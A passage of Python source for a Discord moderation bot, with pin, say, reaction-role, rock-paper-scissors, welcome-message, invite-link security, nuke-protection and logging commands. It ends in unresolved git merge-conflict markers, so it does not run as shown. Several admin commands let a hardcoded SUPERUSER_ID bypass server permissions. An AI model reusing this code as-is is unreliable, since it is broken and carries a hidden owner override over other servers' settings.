        await ctx.send("This channel is disabled for bot commands.")
        return
    embed = discord.Embed(title=f"Role Info - {role.name}", color=role.color)
    embed.add_field(name="ID", value=role.id, inline=True)
    embed.add_field(name="Created At", value=role.created_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=True)
    embed.add_field(name="Color", value=str(role.color), inline=True)
    embed.add_field(name="Hoisted", value="Yes" if role.hoist else "No", inline=True)
    embed.add_field(name="Mentionable", value="Yes" if role.mentionable else "No", inline=True)
    embed.add_field(name="Members", value=len(role.members), inline=True)
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def pin(ctx, *, content: str):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if not content:
        await ctx.send("Please provide a message to pin.")
        return
    for pattern in blocked_mentions:
        if re.search(pattern, content, re.IGNORECASE):
            await ctx.send(f"{ctx.author.mention}, pinned message cannot contain @everyone or @here!")
            return
    content = content.replace('@', '[AT]')
    if ctx.channel.id in pinned_messages:
        last_message_id = pinned_messages[ctx.channel.id].get('last_message_id')
        if last_message_id:
            try:
                last_message = await ctx.channel.fetch_message(last_message_id)
                await last_message.delete()
            except discord.NotFound:
                pass
    pinned_messages[ctx.channel.id] = {'content': content, 'last_message_id': None}
    new_message = await ctx.channel.send(content)
    pinned_messages[ctx.channel.id]['last_message_id'] = new_message.id
    await ctx.send(f"Pinned message set to: {content}")
    await log_event(ctx.guild, "Pinned Message Set", f"Pinned message set in {ctx.channel.mention} by {ctx.author.mention}: {content}")

@bot.command()
async def unpin(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id in pinned_messages:
        last_message_id = pinned_messages[ctx.channel.id].get('last_message_id')
        if last_message_id:
            try:
                last_message = await ctx.channel.fetch_message(last_message_id)
                await last_message.delete()
            except discord.NotFound:
                pass
        del pinned_messages[ctx.channel.id]
        await ctx.send("Pinned message removed.")
        await log_event(ctx.guild, "Pinned Message Removed", f"Pinned message removed in {ctx.channel.mention} by {ctx.author.mention}")
    else:
        await ctx.send("No message is pinned in this channel.")

@bot.command()
async def pinstop(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id in pinned_messages:
        last_message_id = pinned_messages[ctx.channel.id].get('last_message_id')
        if last_message_id:
            try:
                last_message = await ctx.channel.fetch_message(last_message_id)
                await last_message.delete()
            except discord.NotFound:
                pass
        del pinned_messages[ctx.channel.id]
        await ctx.send("Pinned message stopped.")
        await log_event(ctx.guild, "Pinned Message Stopped", f"Pinned message stopped in {ctx.channel.mention} by {ctx.author.mention}")
    else:
        await ctx.send("No message is pinned in this channel.")

@bot.command()
@commands.has_permissions(administrator=True)
async def say(ctx, *, message):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    await ctx.send(message.replace('@', '[AT]'))
    await ctx.message.delete()
    await log_event(ctx.guild, "Say Command Used", f"{ctx.author.mention} used say command: {message.replace('@', '[AT]')}")

@bot.command()
@commands.has_permissions(administrator=True)
async def embed(ctx, *, message):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    embed = discord.Embed(description=message, color=discord.Color.blue())
    await ctx.send(embed=embed)
    await ctx.message.delete()
    await log_event(ctx.guild, "Embed Command Used", f"{ctx.author.mention} used embed command: {message}")

@bot.command()
@commands.has_permissions(administrator=True)
async def reactionrole(ctx, message_id: int, role: discord.Role, emoji):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if role >= ctx.guild.me.top_role:
        await ctx.send("I can't manage a role higher than or equal to my own!")
        return
    message = await ctx.channel.fetch_message(message_id)
    await message.add_reaction(emoji)
    async def on_reaction_add(reaction, user):
        if user.bot or reaction.message.id != message_id:
            return
        if str(reaction.emoji) == emoji:
            await user.add_roles(role)
    async def on_reaction_remove(reaction, user):
        if user.bot or reaction.message.id != message_id:
            return
        if str(reaction.emoji) == emoji:
            await user.remove_roles(role)
    bot.add_listener(on_reaction_add, 'on_reaction_add')
    bot.add_listener(on_reaction_remove, 'on_reaction_remove')
    await ctx.send(f"Reaction role set: {emoji} for {role.name} on message {message_id}.")
    await log_event(ctx.guild, "Reaction Role Set", f"Reaction role set by {ctx.author.mention}: {emoji} for {role.name} on message {message_id}")

@bot.command()
async def rps(ctx, opponent: discord.Member):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if opponent == ctx.author:
        await ctx.send("You can't challenge yourself to rock-paper-scissors!")
        return
    if opponent.bot:
        await ctx.send("You can't challenge a bot to rock-paper-scissors!")
        return
    rps_options = ["🪨", "📜", "✂️"]
    embed = discord.Embed(title="Rock-Paper-Scissors", description=f"{ctx.author.mention} vs {opponent.mention}\nReact with 🪨 (Rock), 📜 (Paper), or ✂️ (Scissors) to make your choice!", color=discord.Color.blue())
    message = await ctx.send(embed=embed)
    for emoji in rps_options:
        await message.add_reaction(emoji)
    
    player_choices = {}
    def check(reaction, user):
        return user in [ctx.author, opponent] and str(reaction.emoji) in rps_options and reaction.message.id == message.id
    
    try:
        while len(player_choices) < 2:
            reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=check)
            player_choices[user.id] = str(reaction.emoji)
            await message.remove_reaction(reaction, user)
        
        player_choice = player_choices[ctx.author.id]
        opponent_choice = player_choices[opponent.id]
        
        wins = {("🪨", "✂️"), ("📜", "🪨"), ("✂️", "📜")}
        if player_choice == opponent_choice:
            result = "It's a tie!"
        elif (player_choice, opponent_choice) in wins:
            result = f"{ctx.author.mention} wins!"
        else:
            result = f"{opponent.mention} wins!"
        
        embed = discord.Embed(title="Rock-Paper-Scissors Result", color=discord.Color.blue())
        embed.add_field(name=f"{ctx.author.name}'s Choice", value=player_choice, inline=True)
        embed.add_field(name=f"{opponent.name}'s Choice", value=opponent_choice, inline=True)
        embed.add_field(name="Result", value=result, inline=False)
        await message.edit(embed=embed)
        await log_event(ctx.guild, "RPS Game", f"{ctx.author.mention} challenged {opponent.mention} to RPS. Result: {result}")
    
    except asyncio.TimeoutError:
        await message.edit(embed=discord.Embed(title="Rock-Paper-Scissors", description="Game timed out! No winner.", color=discord.Color.red()))
        await log_event(ctx.guild, "RPS Game Timeout", f"RPS game between {ctx.author.mention} and {opponent.mention} timed out")

@bot.tree.command(name="welcome_messages", description="Sets a welcome message for new members in this channel (Admin only)")
async def welcome_messages(interaction: discord.Interaction, message: str):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    welcome_channels[interaction.channel.id] = message
    await interaction.response.send_message(f"Welcome message set for this channel: {message}", ephemeral=False)
    await log_event(interaction.guild, "Welcome Message Set", f"Welcome message set in {interaction.channel.mention} by {interaction.user.mention}: {message}")

@bot.tree.command(name="welcome_messages_stop", description="Stops welcome messages in this channel (Admin only)")
async def welcome_messages_stop(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    if interaction.channel.id in welcome_channels:
        del welcome_channels[interaction.channel.id]
        await interaction.response.send_message("Welcome messages stopped in this channel.", ephemeral=False)
        await log_event(interaction.guild, "Welcome Messages Stopped", f"Welcome messages stopped in {interaction.channel.mention} by {interaction.user.mention}")
    else:
        await interaction.response.send_message("No welcome message is set in this channel.", ephemeral=False)

@bot.tree.command(name="enable_security_channel", description="Enables invite link security in this channel (Admin only)")
async def enable_security_channel(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    if interaction.channel.id not in security_channels:
        security_channels.add(interaction.channel.id)
        await interaction.response.send_message("Invite link security enabled in this channel. Users posting invite links will be timed out for 1 minute.", ephemeral=False)
        await log_event(interaction.guild, "Security Enabled", f"Invite link security enabled in {interaction.channel.mention} by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Invite link security is already enabled in this channel!", ephemeral=False)

@bot.tree.command(name="disable_security_channel", description="Disables invite link security in this channel (Admin only)")
async def disable_security_channel(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    if interaction.channel.id in security_channels:
        security_channels.remove(interaction.channel.id)
        await interaction.response.send_message("Invite link security disabled in this channel.", ephemeral=False)
        await log_event(interaction.guild, "Security Disabled", f"Invite link security disabled in {interaction.channel.mention} by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Invite link security is not enabled in this channel.", ephemeral=False)

@bot.tree.command(name="enable_security_server", description="Enables invite link security in all channels of the server (Admin only)")
async def enable_security_server(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.guild.id not in security_servers:
        security_servers.add(interaction.guild.id)
        await interaction.response.send_message("Invite link security enabled for the entire server. Users posting invite links will be timed out for 1 minute.", ephemeral=False)
        await log_event(interaction.guild, "Server Security Enabled", f"Invite link security enabled server-wide by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Invite link security is already enabled for the server!", ephemeral=False)

@bot.tree.command(name="disable_security_server", description="Disables invite link security in all channels of the server (Admin only)")
async def disable_security_server(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.guild.id in security_servers:
        security_servers.remove(interaction.guild.id)
        await interaction.response.send_message("Invite link security disabled for the entire server.", ephemeral=False)
        await log_event(interaction.guild, "Server Security Disabled", f"Invite link security disabled server-wide by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Invite link security is not enabled for the server.", ephemeral=False)

@bot.tree.command(name="enable_nuke_protection", description="Enables nuke protection for the server (Admin only)")
async def enable_nuke_protection(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.guild.id not in nuke_protection_servers:
        nuke_protection_servers.add(interaction.guild.id)
        await interaction.response.send_message("Nuke protection enabled for the server. Excessive role mentions, channel creations/deletions, or bans/kicks will result in quarantine.", ephemeral=False)
        await log_event(interaction.guild, "Nuke Protection Enabled", f"Nuke protection enabled server-wide by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Nuke protection is already enabled for the server!", ephemeral=False)

@bot.tree.command(name="disable_nuke_protection", description="Disables nuke protection for the server (Admin only)")
async def disable_nuke_protection(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.guild.id in nuke_protection_servers:
        nuke_protection_servers.remove(interaction.guild.id)
        await interaction.response.send_message("Nuke protection disabled for the server.", ephemeral=False)
        await log_event(interaction.guild, "Nuke Protection Disabled", f"Nuke protection disabled server-wide by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Nuke protection is not enabled for the server.", ephemeral=False)

@bot.tree.command(name="log_enable", description="Enables logging of commands and major events in this channel (Admin only)")
async def log_enable(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    log_channels[interaction.guild.id] = interaction.channel.id
    await interaction.response.send_message("Logging enabled in this channel for commands and major events.", ephemeral=False)
    await log_event(interaction.guild, "Logging Enabled", f"Logging enabled in {interaction.channel.mention} by {interaction.user.mention}")

@bot.tree.command(name="log_disable", description="Disables logging in this channel (Admin only)")
async def log_disable(interaction: discord.Interaction):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    if interaction.guild.id in log_channels:
        del log_channels[interaction.guild.id]
        await interaction.response.send_message("Logging disabled for this server.", ephemeral=False)
        await log_event(interaction.guild, "Logging Disabled", f"Logging disabled by {interaction.user.mention}")
    else:
        await interaction.response.send_message("Logging is not enabled for this server.", ephemeral=False)

@bot.tree.command(name="autowarn", description="Sets automatic warnings for specific keywords or phrases (Admin only)")
async def slash_autowarn(interaction: discord.Interaction, keyword: str, action: str):
    if interaction.user.id != SUPERUSER_ID and not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command!", ephemeral=True)
        return
    if interaction.channel.id in disabled_channels:
        await interaction.response.send_message("This channel is disabled for bot commands.", ephemeral=True)
        return
    if action.lower() not in ["warn", "mute"]:
        await interaction.response.send_message("Action must be 'warn' or 'mute'.", ephemeral=True)
        return
    guild_id = interaction.guild.id
    if guild_id not in autowarn_rules:
        autowarn_rules[guild_id] = {}
    autowarn_rules[guild_id][keyword.lower()] = action.lower()
    await interaction.response.send_message(f"Auto-warn set for keyword '{keyword}' with action '{action}'.", ephemeral=False)
    await log_event(interaction.guild, "Auto-Warn Set", f"Auto-warn set for keyword '{keyword}' with action '{action}' by {interaction.user.mention}")

@bot.event
async def on_command_error(ctx, error):
    if ctx.channel.id in disabled_channels:
        return
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need the required permissions to use this command!")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Missing required argument. Check command usage.")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("Member not found. Please mention a valid member.")
    elif isinstance(error, commands.MessageNotFound):
        await ctx.send("Message not found. Please provide a valid message link or ID.")
    else:
        await ctx.send(f"An error occurred: {str(error)}")

bot.run(os.getenv('DISCORD_TOKEN'))
=======
from petezah.bot import main

if __name__ == "__main__":
    main()
>>>>>>> f69f5de (complete redo)
